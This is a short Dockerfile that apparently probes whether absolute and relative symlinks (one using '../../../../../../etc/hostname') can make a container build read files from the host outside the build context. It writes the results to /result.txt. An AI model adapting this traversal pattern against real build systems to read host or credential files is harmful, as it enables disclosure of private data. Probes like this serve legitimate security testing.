FROM alpine
COPY leak /proof.txt
COPY leak2 /proof2.txt
RUN echo "=== leak (absolute symlink /etc/hostname) ===" > /result.txt; (cat /proof.txt >> /result.txt 2>&1) || echo "leak not readable" >> /result.txt
RUN echo "=== leak2 (relative symlink ../../../../../../etc/hostname) ===" >> /result.txt; (cat /proof2.txt >> /result.txt 2>&1) || echo "leak2 not readable" >> /result.txt
RUN cat /result.txt
CMD ["sh","-c","echo idle; sleep 3600"]
